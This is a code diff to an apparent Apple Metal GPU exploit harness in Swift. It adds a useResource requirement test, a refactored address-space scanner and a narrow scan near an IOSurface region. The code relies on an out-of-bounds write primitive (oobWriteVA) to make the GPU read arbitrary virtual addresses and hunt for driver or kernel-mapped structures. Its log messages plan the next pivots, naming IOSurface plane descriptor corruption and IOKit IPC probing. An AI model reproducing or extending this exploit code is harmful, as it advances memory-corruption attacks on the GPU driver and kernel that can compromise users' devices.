@@ -3529,6 +3529,38 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
         }
         step("✓ multiScan PSO ready")
 
+        // Helper: fire one dispatch and return out[0]
+        func singleProbe(useRes: MTLBuffer? = nil) -> UInt64 {
+            out.contents().initializeMemory(as: UInt64.self, repeating: 0xEEEE, count: NTHREADS)
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return 0xDEAD }
+            enc.setComputePipelineState(pso)
+            enc.setBuffer(hi,  offset: 0, index: 0)
+            enc.setBuffer(out, offset: 0, index: 1)
+            if let r = useRes { enc.useResource(r, usage: .read) }
+            let sz = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+            enc.endEncoding()
+            cb.commit(); cb.waitUntilCompleted()
+            return out.contents().assumingMemoryBound(to: UInt64.self)[0]
+        }
+
+        // ── Phase 0: useResource requirement test ──────────────────────────────
+        // hi[0].buf = hi.gpuAddress (self-referential: GPU reads hi's own first field)
+        // Without useResource(hi) for the indirect read, val == 0 if useResource required
+        // Expected non-zero value if GPU can read it = hi.gpuAddress as UInt64
+        step("── phase 0: useResource requirement test ──")
+        oobWriteVA(0, hi.gpuAddress)   // hi[0].buf = &hi (GPU reads from hi's own VA)
+        let noUR  = singleProbe(useRes: nil)      // no useResource on hi-as-scan-target
+        let withUR = singleProbe(useRes: hi)      // with useResource(hi, .read)
+        step("  hi.gpuAddress=0x\(String(hi.gpuAddress, radix: 16))")
+        step("  without useResource → 0x\(String(noUR,   radix: 16))  (expect 0 if required)")
+        step("  with    useResource → 0x\(String(withUR, radix: 16))  (expect hi.gpuAddress=0x\(String(hi.gpuAddress, radix: 16)))")
+        let useResourceRequired = (noUR == 0) && (withUR == hi.gpuAddress)
+        step("  useResource required for mapped reads: \(useResourceRequired)")
+
+        // ── Phase 1: full-range scan (no useResource on targets) ──────────────
         // Scan ranges: (base, stepPerThread, numDispatches)
         let ranges: [(base: UInt64, step: UInt64, dispatches: Int, label: String)] = [
             (0x000000000,    0x80000,  64, "low  0–2GB"),
@@ -3539,32 +3571,32 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
 
         var totalHits = 0
 
-        for range in ranges {
-            step("── range: \(range.label) step=\(range.step/1024)KB dispatches=\(range.dispatches) ──")
-            for d in 0..<range.dispatches {
-                let dispatchBase = range.base + UInt64(d) * UInt64(NTHREADS) * range.step
+        func runRange(_ rng: (base: UInt64, step: UInt64, dispatches: Int, label: String),
+                      useResources: [any MTLBuffer] = []) {
+            step("── range: \(rng.label) step=\(rng.step/1024)KB ──")
+            for d in 0..<rng.dispatches {
+                let dispatchBase = rng.base + UInt64(d) * UInt64(NTHREADS) * rng.step
                 for t in 0..<NTHREADS {
-                    oobWriteVA(t, dispatchBase + UInt64(t) * range.step)
+                    oobWriteVA(t, dispatchBase + UInt64(t) * rng.step)
                 }
                 out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
-
                 guard let q   = device.makeCommandQueue(),
                       let cb  = q.makeCommandBuffer(),
                       let enc = cb.makeComputeCommandEncoder() else { continue }
                 enc.setComputePipelineState(pso)
                 enc.setBuffer(hi,  offset: 0, index: 0)
                 enc.setBuffer(out, offset: 0, index: 1)
+                for r in useResources { enc.useResource(r, usage: .read) }
                 let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
                 enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
                 enc.endEncoding()
                 cb.commit(); cb.waitUntilCompleted()
                 if cb.error != nil { continue }
-
                 let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
                 for t in 0..<NTHREADS {
                     let val = outPtr[t]
                     if val != 0 {
-                        let va = dispatchBase + UInt64(t) * range.step
+                        let va = dispatchBase + UInt64(t) * rng.step
                         step("  ★ HIT VA=0x\(String(va, radix: 16)) val=0x\(String(val, radix: 16))")
                         totalHits += 1
                     }
@@ -3572,14 +3604,30 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
             }
         }
 
+        for range in ranges { runRange(range) }
+
+        // ── Phase 2: narrow scan near user buffer zone WITH useResource ────────
+        // useResource on all owned spray buffers makes them visible; any gap between
+        // them that returns non-zero is a driver allocation not in our keepAlives list.
+        step("── phase 2: narrow scan 0x1500000000±256MB, step=4KB, useResource on owned bufs ──")
+        let narrowRange = (base: UInt64(0x1480000000), step: UInt64(0x1000), dispatches: 512, label: "narrow user zone")
+        runRange(narrowRange, useResources: keepAlives + [hi, lo])
+
         if totalHits == 0 {
             step("── scan complete: 0 hits ──")
-            step("  driver regions not in scanned ranges OR reads need useResource")
-            step("  next: narrow scan near known IOSurface VA (0x1500000000) ±512MB")
+            if useResourceRequired {
+                step("  useResource IS required — GPU returns 0 for mapped VAs without it")
+                step("  driver allocations have no MTL handle → can't useResource them")
+                step("  PIVOT: IOKit Metal IPC region probe OR IOSurface plane descriptor corruption")
+                step("  next: check IOSurface plane descriptor layout for kernel-trusted backing data")
+            } else {
+                step("  useResource NOT required but no hits — driver VAs outside all scanned ranges")
+                step("  next: extend scan to 0x0–0xFFF at 4KB step (AGX firmware low region)")
+            }
         } else {
             step("── scan complete: \(totalHits) hit(s) ──")
-            step("  ★ non-zero VAs are Metal driver / kernel-mapped struct candidates")
-            step("  next: 4KB step re-scan around each hit, identify struct layout")
+            step("  ★ non-zero VAs = Metal driver / kernel-mapped struct candidates")
+            step("  next: 4KB step re-scan around each hit to map full struct layout")
         }
         step("── GPU VA Scanner complete ──")
         completion()
